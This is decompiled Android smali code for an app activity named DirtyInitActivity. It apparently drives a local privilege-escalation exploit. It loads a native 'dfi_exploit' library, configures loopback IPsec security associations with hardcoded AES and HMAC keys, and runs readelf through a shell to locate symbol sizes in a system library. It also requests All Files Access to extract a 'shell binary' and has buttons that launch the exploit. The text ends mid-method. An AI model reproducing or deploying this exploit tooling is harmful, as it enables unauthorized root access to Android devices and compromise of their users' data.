.class public Lcom/dirty/init/DirtyInitActivity;
.super Landroid/app/Activity;
.source "DirtyInitActivity.java"


# static fields
.field private static final AES_CBC_KEY:[B

.field private static final ALL_FILES_PERMISSION_CODE:I = 0x7eb

.field private static final COLOR_BG:I = -0x1000000

.field private static final COLOR_OUTPUT:I = -0xff00bf

.field private static final COLOR_STATUS_DONE:I = -0xff198a

.field private static final COLOR_STATUS_ERR:I = -0x9495

.field private static final COLOR_STATUS_OK:I = -0xb24954

.field private static final COLOR_STATUS_WARN:I = -0x5600

.field private static final COLOR_TEAL:I = -0xb24954

.field private static final COLOR_TITLE:I = -0x1

.field private static final HMAC_SHA256_KEY:[B

.field private static final HMAC_TRUNC_BITS:I = 0x80

.field private static final STORAGE_PERMISSION_CODE:I = 0x7ea

.field private static final TAG:Ljava/lang/String; = "DIRTY_INIT"


# instance fields
.field private activeEncapPort:I

.field private activeSpi:I

.field private encapSocket:Landroid/net/IpSecManager$UdpEncapsulationSocket;

.field private executeButton:Landroid/widget/Button;

.field private extractButton:Landroid/widget/Button;

.field public stage:I

.field private logView:Landroid/widget/TextView;

.field private pendingExtractAfterPermission:Z

.field private scrollView:Landroid/widget/ScrollView;

.field private spiObj:Landroid/net/IpSecManager$SecurityParameterIndex;

.field private statusText:Landroid/widget/TextView;

.field private transform:Landroid/net/IpSecTransform;


# direct methods
.method static bridge synthetic -$$Nest$fgetactiveEncapPort(Lcom/dirty/init/DirtyInitActivity;)I
    .locals 0

    iget p0, p0, Lcom/dirty/init/DirtyInitActivity;->activeEncapPort:I

    return p0
.end method

.method static bridge synthetic -$$Nest$fgetactiveSpi(Lcom/dirty/init/DirtyInitActivity;)I
    .locals 0

    iget p0, p0, Lcom/dirty/init/DirtyInitActivity;->activeSpi:I

    return p0
.end method

.method static bridge synthetic -$$Nest$fgetexecuteButton(Lcom/dirty/init/DirtyInitActivity;)Landroid/widget/Button;
    .locals 0

    iget-object p0, p0, Lcom/dirty/init/DirtyInitActivity;->executeButton:Landroid/widget/Button;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetextractButton(Lcom/dirty/init/DirtyInitActivity;)Landroid/widget/Button;
    .locals 0

    iget-object p0, p0, Lcom/dirty/init/DirtyInitActivity;->extractButton:Landroid/widget/Button;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetlogView(Lcom/dirty/init/DirtyInitActivity;)Landroid/widget/TextView;
    .locals 0

    iget-object p0, p0, Lcom/dirty/init/DirtyInitActivity;->logView:Landroid/widget/TextView;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetscrollView(Lcom/dirty/init/DirtyInitActivity;)Landroid/widget/ScrollView;
    .locals 0

    iget-object p0, p0, Lcom/dirty/init/DirtyInitActivity;->scrollView:Landroid/widget/ScrollView;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetstatusText(Lcom/dirty/init/DirtyInitActivity;)Landroid/widget/TextView;
    .locals 0

    iget-object p0, p0, Lcom/dirty/init/DirtyInitActivity;->statusText:Landroid/widget/TextView;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$mappendLog(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->appendLog(Ljava/lang/String;)V

    return-void
.end method

.method static bridge synthetic -$$Nest$menableExecButton(Lcom/dirty/init/DirtyInitActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->enableExecButton()V

    return-void
.end method

.method static bridge synthetic -$$Nest$menableExtractButton(Lcom/dirty/init/DirtyInitActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->enableExtractButton()V

    return-void
.end method

.method static bridge synthetic -$$Nest$mextractDirtyInit(Lcom/dirty/init/DirtyInitActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->extractDirtyInit()V

    return-void
.end method

.method static bridge synthetic -$$Nest$mgetLogMessageSize(Lcom/dirty/init/DirtyInitActivity;)I
    .locals 0

    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->getLogMessageSize()I

    move-result p0

    return p0
.end method

.method static bridge synthetic -$$Nest$mloadAsset(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)[B
    .locals 0

    invoke-direct {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->loadAsset(Ljava/lang/String;)[B

    move-result-object p0

    return-object p0
.end method

.method static bridge synthetic -$$Nest$mnativeDfiExploit(Lcom/dirty/init/DirtyInitActivity;II[B[BILjava/lang/Object;)Ljava/lang/String;
    .locals 0

    invoke-direct/range {p0 .. p6}, Lcom/dirty/init/DirtyInitActivity;->nativeDfiExploit(II[B[BILjava/lang/Object;)Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method static bridge synthetic -$$Nest$mrunDfiExploit(Lcom/dirty/init/DirtyInitActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->runDfiExploit()V

    return-void
.end method

.method static bridge synthetic -$$Nest$msetStatus(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;I)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/dirty/init/DirtyInitActivity;->setStatus(Ljava/lang/String;I)V

    return-void
.end method

.method static bridge synthetic -$$Nest$msetupSA(Lcom/dirty/init/DirtyInitActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->setupSA()V

    return-void
.end method

.method static bridge synthetic -$$Nest$mteardownSA(Lcom/dirty/init/DirtyInitActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->teardownSA()V

    return-void
.end method

.method static bridge synthetic -$$Nest$sfgetAES_CBC_KEY()[B
    .locals 1

    sget-object v0, Lcom/dirty/init/DirtyInitActivity;->AES_CBC_KEY:[B

    return-object v0
.end method

.method static bridge synthetic -$$Nest$sfgetHMAC_SHA256_KEY()[B
    .locals 1

    sget-object v0, Lcom/dirty/init/DirtyInitActivity;->HMAC_SHA256_KEY:[B

    return-object v0
.end method

.method static constructor <clinit>()V
    .locals 2

    const/16 v0, 0x20

    .line 68
    new-array v1, v0, [B

    fill-array-data v1, :array_0

    sput-object v1, Lcom/dirty/init/DirtyInitActivity;->AES_CBC_KEY:[B

    .line 76
    new-array v0, v0, [B

    fill-array-data v0, :array_1

    sput-object v0, Lcom/dirty/init/DirtyInitActivity;->HMAC_SHA256_KEY:[B

    .line 84
    const-string v0, "dfi_exploit"

    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V

    return-void

    :array_0
    .array-data 1
        0x41t
        0x42t
        0x43t
        0x44t
        0x45t
        0x46t
        0x47t
        0x48t
        0x49t
        0x4at
        0x4bt
        0x4ct
        0x4dt
        0x4et
        0x4ft
        0x50t
        0x51t
        0x52t
        0x53t
        0x54t
        0x55t
        0x56t
        0x57t
        0x58t
        0x59t
        0x5at
        0x30t
        0x31t
        0x32t
        0x33t
        0x34t
        0x35t
    .end array-data

    :array_1
    .array-data 1
        0x48t
        0x4dt
        0x41t
        0x43t
        0x4bt
        0x45t
        0x59t
        0x5ft
        0x46t
        0x4ft
        0x52t
        0x5ft
        0x44t
        0x49t
        0x52t
        0x54t
        0x59t
        0x49t
        0x4et
        0x49t
        0x54t
        0x5ft
        0x43t
        0x42t
        0x43t
        0x5ft
        0x4dt
        0x4ft
        0x44t
        0x45t
        0x21t
        0x21t
    .end array-data
.end method

.method public constructor <init>()V
    .locals 1

    .line 38
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/4 v0, 0x0

    .line 43
    iput-boolean v0, p0, Lcom/dirty/init/DirtyInitActivity;->pendingExtractAfterPermission:Z

    return-void
.end method

.method private appendLog(Ljava/lang/String;)V
    .locals 1

    .line 456
    const-string v0, "DIRTY_INIT"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 457
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v0, "\n"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->onNativeProgress(Ljava/lang/String;)V

    return-void
.end method

.method private createButton(Ljava/lang/String;)Landroid/widget/Button;
    .locals 4

    .line 115
    new-instance v0, Landroid/widget/Button;

    invoke-direct {v0, p0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    .line 116
    invoke-virtual {v0, p1}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    const p1, -0x1f1f20

    .line 117
    invoke-virtual {v0, p1}, Landroid/widget/Button;->setTextColor(I)V

    const/high16 p1, 0x41600000    # 14.0f

    .line 118
    invoke-virtual {v0, p1}, Landroid/widget/Button;->setTextSize(F)V

    .line 119
    sget-object v1, Landroid/graphics/Typeface;->DEFAULT:Landroid/graphics/Typeface;

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Landroid/widget/Button;->setTypeface(Landroid/graphics/Typeface;I)V

    .line 120
    invoke-virtual {v0, v2}, Landroid/widget/Button;->setAllCaps(Z)V

    .line 121
    new-instance v1, Landroid/graphics/drawable/StateListDrawable;

    invoke-direct {v1}, Landroid/graphics/drawable/StateListDrawable;-><init>()V

    const v3, 0x10100a7

    .line 122
    filled-new-array {v3}, [I

    move-result-object v3

    invoke-direct {p0, v2}, Lcom/dirty/init/DirtyInitActivity;->makeGlassButton(Z)Landroid/graphics/drawable/GradientDrawable;

    move-result-object v2

    invoke-virtual {v1, v3, v2}, Landroid/graphics/drawable/StateListDrawable;->addState([ILandroid/graphics/drawable/Drawable;)V

    const/4 v2, 0x0

    .line 123
    new-array v3, v2, [I

    invoke-direct {p0, v2}, Lcom/dirty/init/DirtyInitActivity;->makeGlassButton(Z)Landroid/graphics/drawable/GradientDrawable;

    move-result-object v2

    invoke-virtual {v1, v3, v2}, Landroid/graphics/drawable/StateListDrawable;->addState([ILandroid/graphics/drawable/Drawable;)V

    .line 124
    invoke-virtual {v0, v1}, Landroid/widget/Button;->setBackground(Landroid/graphics/drawable/Drawable;)V

    const/high16 v1, 0x41800000    # 16.0f

    .line 125
    invoke-direct {p0, v1}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v2

    float-to-int v2, v2

    invoke-direct {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v3

    float-to-int v3, v3

    invoke-direct {p0, v1}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v1

    float-to-int v1, v1

    invoke-direct {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result p1

    float-to-int p1, p1

    invoke-virtual {v0, v2, v3, v1, p1}, Landroid/widget/Button;->setPadding(IIII)V

    const/4 p1, 0x0

    .line 126
    invoke-virtual {v0, p1}, Landroid/widget/Button;->setStateListAnimator(Landroid/animation/StateListAnimator;)V

    return-object v0
.end method

.method private createLabel(Ljava/lang/String;)Landroid/widget/TextView;
    .locals 3

    .line 131
    new-instance v0, Landroid/widget/TextView;

    invoke-direct {v0, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 132
    invoke-virtual {v0, p1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const p1, -0xb24954

    .line 133
    invoke-virtual {v0, p1}, Landroid/widget/TextView;->setTextColor(I)V

    const/high16 p1, 0x41400000    # 12.0f

    .line 134
    invoke-virtual {v0, p1}, Landroid/widget/TextView;->setTextSize(F)V

    .line 135
    sget-object v1, Landroid/graphics/Typeface;->DEFAULT:Landroid/graphics/Typeface;

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;I)V

    .line 136
    invoke-direct {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result p1

    float-to-int p1, p1

    const/high16 v1, 0x40800000    # 4.0f

    invoke-direct {p0, v1}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v1

    float-to-int v1, v1

    invoke-virtual {v0, v2, p1, v2, v1}, Landroid/widget/TextView;->setPadding(IIII)V

    return-object v0
.end method

.method private doExtract()V
    .locals 2

    .line 363
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->extractButton:Landroid/widget/Button;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setEnabled(Z)V

    .line 364
    const-string v0, "Extracting..."

    const/16 v1, -0x5600

    invoke-direct {p0, v0, v1}, Lcom/dirty/init/DirtyInitActivity;->setStatus(Ljava/lang/String;I)V

    .line 366
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/dirty/init/DirtyInitActivity$3;

    invoke-direct {v1, p0}, Lcom/dirty/init/DirtyInitActivity$3;-><init>(Lcom/dirty/init/DirtyInitActivity;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 413
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private dp(F)F
    .locals 1

    .line 99
    invoke-virtual {p0}, Lcom/dirty/init/DirtyInitActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v0

    iget v0, v0, Landroid/util/DisplayMetrics;->density:F

    mul-float/2addr p1, v0

    return p1
.end method

.method private enableExecButton()V
    .locals 1

    .line 639
    new-instance v0, Lcom/dirty/init/DirtyInitActivity$8;

    invoke-direct {v0, p0}, Lcom/dirty/init/DirtyInitActivity$8;-><init>(Lcom/dirty/init/DirtyInitActivity;)V

    invoke-virtual {p0, v0}, Lcom/dirty/init/DirtyInitActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method private enableExtractButton()V
    .locals 1

    .line 417
    new-instance v0, Lcom/dirty/init/DirtyInitActivity$4;

    invoke-direct {v0, p0}, Lcom/dirty/init/DirtyInitActivity$4;-><init>(Lcom/dirty/init/DirtyInitActivity;)V

    invoke-virtual {p0, v0}, Lcom/dirty/init/DirtyInitActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method private extractDirtyInit()V
    .locals 3

    .line 302
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1e

    const/4 v2, 0x1

    if-lt v0, v1, :cond_0

    .line 303
    invoke-static {}, Landroid/os/Environment;->isExternalStorageManager()Z

    move-result v0

    if-nez v0, :cond_1

    .line 304
    iput-boolean v2, p0, Lcom/dirty/init/DirtyInitActivity;->pendingExtractAfterPermission:Z

    .line 305
    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->requestStoragePermissions()V

    return-void

    .line 309
    :cond_0
    const-string v0, "android.permission.WRITE_EXTERNAL_STORAGE"

    invoke-virtual {p0, v0}, Lcom/dirty/init/DirtyInitActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_1

    .line 311
    iput-boolean v2, p0, Lcom/dirty/init/DirtyInitActivity;->pendingExtractAfterPermission:Z

    .line 312
    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->requestStoragePermissions()V

    return-void

    .line 316
    :cond_1
    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->doExtract()V

    return-void
.end method

.method private getLogMessageSize()I
    .locals 9

    .line 580
    const-string v0, "DIRTY_INIT"

    .line 0
    const-string v1, "~LogMessage size: "

    const-string v2, "readelf: unexpected format: "

    const/4 v3, -0x1

    .line 580
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v4

    const/4 v5, 0x3

    new-array v5, v5, [Ljava/lang/String;

    const-string v6, "/system/bin/sh"

    const/4 v7, 0x0

    aput-object v6, v5, v7

    const-string v6, "-c"

    const/4 v7, 0x1

    aput-object v6, v5, v7

    const-string v6, "/system/bin/readelf -s /system/lib64/libbase.so | grep LogMessageD2Ev"

    const/4 v7, 0x2

    aput-object v6, v5, v7

    invoke-virtual {v4, v5}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v4

    .line 586
    new-instance v5, Ljava/io/BufferedReader;

    new-instance v6, Ljava/io/InputStreamReader;

    .line 587
    invoke-virtual {v4}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v8

    invoke-direct {v6, v8}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v5, v6}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 588
    invoke-virtual {v5}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v6

    .line 589
    invoke-virtual {v4}, Ljava/lang/Process;->waitFor()I

    .line 590
    invoke-virtual {v5}, Ljava/io/BufferedReader;->close()V

    if-eqz v6, :cond_2

    .line 592
    invoke-virtual {v6}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-eqz v4, :cond_0

    goto :goto_0

    .line 600
    :cond_0
    invoke-virtual {v6}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v4

    const-string v5, "\\s+"

    invoke-virtual {v4, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    .line 606
    array-length v5, v4

    const/4 v8, 0x4

    if-ge v5, v8, :cond_1

    .line 607
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    return v3

    .line 611
    :cond_1
    aget-object v2, v4, v7

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    .line 612
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v4, " bytes (from readelf)"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return v2

    .line 593
    :cond_2
    :goto_0
    const-string v1, "readelf: no LogMessageD2Ev found"

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return v3

    :catch_0
    move-exception v1

    .line 616
    const-string v2, "getLogMessageSize failed"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    return v3
.end method

.method private loadAsset(Ljava/lang/String;)[B
    .locals 5

    .line 623
    :try_start_0
    invoke-virtual {p0}, Lcom/dirty/init/DirtyInitActivity;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v0

    .line 624
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    const/16 v2, 0x1000

    .line 625
    new-array v2, v2, [B

    .line 627
    :goto_0
    invoke-virtual {v0, v2}, Ljava/io/InputStream;->read([B)I

    move-result v3

    const/4 v4, -0x1

    if-eq v3, v4, :cond_0

    const/4 v4, 0x0

    .line 628
    invoke-virtual {v1, v2, v4, v3}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    goto :goto_0

    .line 630
    :cond_0
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V

    .line 631
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p1

    :catch_0
    move-exception v0

    .line 633
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "Failed to load asset: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v1, "DIRTY_INIT"

    invoke-static {v1, p1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    const/4 p1, 0x0

    return-object p1
.end method

.method private makeGlassButton(Z)Landroid/graphics/drawable/GradientDrawable;
    .locals 3

    const v0, -0xe1d1d2

    if-eqz p1, :cond_0

    move v1, v0

    goto :goto_0

    :cond_0
    const v1, -0xc5b5b6

    :goto_0
    if-eqz p1, :cond_1

    const v0, -0xeae0e1

    .line 105
    :cond_1
    new-instance p1, Landroid/graphics/drawable/GradientDrawable;

    sget-object v2, Landroid/graphics/drawable/GradientDrawable$Orientation;->TOP_BOTTOM:Landroid/graphics/drawable/GradientDrawable$Orientation;

    filled-new-array {v1, v0}, [I

    move-result-object v0

    invoke-direct {p1, v2, v0}, Landroid/graphics/drawable/GradientDrawable;-><init>(Landroid/graphics/drawable/GradientDrawable$Orientation;[I)V

    const/4 v0, 0x0

    .line 108
    invoke-virtual {p1, v0}, Landroid/graphics/drawable/GradientDrawable;->setShape(I)V

    const/high16 v0, 0x41200000    # 10.0f

    .line 109
    invoke-direct {p0, v0}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v0

    invoke-virtual {p1, v0}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    const/high16 v0, 0x3f800000    # 1.0f

    .line 110
    invoke-direct {p0, v0}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v0

    float-to-int v0, v0

    const v1, -0xa58586

    invoke-virtual {p1, v0, v1}, Landroid/graphics/drawable/GradientDrawable;->setStroke(II)V

    return-object p1
.end method

.method private native nativeDfiExploit(II[B[BILjava/lang/Object;)Ljava/lang/String;
.end method

.method private requestStoragePermissions()V
    .locals 5

    .line 265
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1e

    const/4 v2, 0x0

    if-lt v0, v1, :cond_0

    .line 266
    invoke-static {}, Landroid/os/Environment;->isExternalStorageManager()Z

    move-result v0

    if-nez v0, :cond_2

    .line 267
    new-instance v0, Landroid/app/AlertDialog$Builder;

    const v1, 0x1030226

    invoke-direct {v0, p0, v1}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;I)V

    const-string v1, "Storage Access Required"

    .line 268
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const-string v1, "This app needs All Files Access to extract the shell binary.\n\nGrant permission in the next screen."

    .line 269
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    new-instance v1, Lcom/dirty/init/DirtyInitActivity$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/dirty/init/DirtyInitActivity$$ExternalSyntheticLambda0;-><init>(Lcom/dirty/init/DirtyInitActivity;)V

    .line 272
    const-string v3, "GRANT"

    invoke-virtual {v0, v3, v1}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const-string v1, "LATER"

    const/4 v3, 0x0

    .line 278
    invoke-virtual {v0, v1, v3}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    .line 279
    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    .line 280
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    goto :goto_1

    :cond_0
    const/4 v0, 0x2

    .line 283
    new-array v1, v0, [Ljava/lang/String;

    const-string v3, "android.permission.WRITE_EXTERNAL_STORAGE"

    aput-object v3, v1, v2

    const-string v3, "android.permission.READ_EXTERNAL_STORAGE"

    const/4 v4, 0x1

    aput-object v3, v1, v4

    :goto_0
    if-ge v2, v0, :cond_2

    .line 289
    aget-object v3, v1, v2

    .line 290
    invoke-virtual {p0, v3}, Lcom/dirty/init/DirtyInitActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v3

    if-eqz v3, :cond_1

    const/16 v0, 0x7ea

    .line 296
    invoke-virtual {p0, v1, v0}, Lcom/dirty/init/DirtyInitActivity;->requestPermissions([Ljava/lang/String;I)V

    goto :goto_1

    :cond_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_2
    :goto_1
    return-void
.end method

.method private runDfiExploit()V
    .locals 2

    .line 471
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->executeButton:Landroid/widget/Button;

    invoke-virtual {v0}, Landroid/widget/Button;->isEnabled()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    .line 472
    :cond_0
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->executeButton:Landroid/widget/Button;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setEnabled(Z)V

    .line 473
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->executeButton:Landroid/widget/Button;

    const-string v1, "RUNNING..."

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    .line 474
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->logView:Landroid/widget/TextView;

    const-string v1, ""

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 475
    const-string v0, "Initializing..."

    const/16 v1, -0x5600

    invoke-direct {p0, v0, v1}, Lcom/dirty/init/DirtyInitActivity;->setStatus(Ljava/lang/String;I)V

    .line 477
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/dirty/init/DirtyInitActivity$7;

    invoke-direct {v1, p0}, Lcom/dirty/init/DirtyInitActivity$7;-><init>(Lcom/dirty/init/DirtyInitActivity;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 564
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private setStatus(Ljava/lang/String;I)V
    .locals 1

    .line 461
    new-instance v0, Lcom/dirty/init/DirtyInitActivity$6;

    invoke-direct {v0, p0, p1, p2}, Lcom/dirty/init/DirtyInitActivity$6;-><init>(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;I)V

    invoke-virtual {p0, v0}, Lcom/dirty/init/DirtyInitActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method private setupSA()V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 653
    const-string v0, "ipsec"

    invoke-virtual {p0, v0}, Lcom/dirty/init/DirtyInitActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/IpSecManager;

    if-eqz v0, :cond_0

    .line 656
    const-string v1, "127.0.0.1"

    invoke-static {v1}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    move-result-object v1

    .line 658
    invoke-virtual {v0, v1}, Landroid/net/IpSecManager;->allocateSecurityParameterIndex(Ljava/net/InetAddress;)Landroid/net/IpSecManager$SecurityParameterIndex;

    move-result-object v2

    iput-object v2, p0, Lcom/dirty/init/DirtyInitActivity;->spiObj:Landroid/net/IpSecManager$SecurityParameterIndex;

    .line 659
    invoke-virtual {v2}, Landroid/net/IpSecManager$SecurityParameterIndex;->getSpi()I

    move-result v2

    iput v2, p0, Lcom/dirty/init/DirtyInitActivity;->activeSpi:I

    .line 662
    new-instance v2, Landroid/net/IpSecAlgorithm;

    const-string v3, "cbc(aes)"

    sget-object v4, Lcom/dirty/init/DirtyInitActivity;->AES_CBC_KEY:[B

    invoke-direct {v2, v3, v4}, Landroid/net/IpSecAlgorithm;-><init>(Ljava/lang/String;[B)V

    .line 663
    new-instance v3, Landroid/net/IpSecAlgorithm;

    sget-object v4, Lcom/dirty/init/DirtyInitActivity;->HMAC_SHA256_KEY:[B

    const/16 v5, 0x80

    const-string v6, "hmac(sha256)"

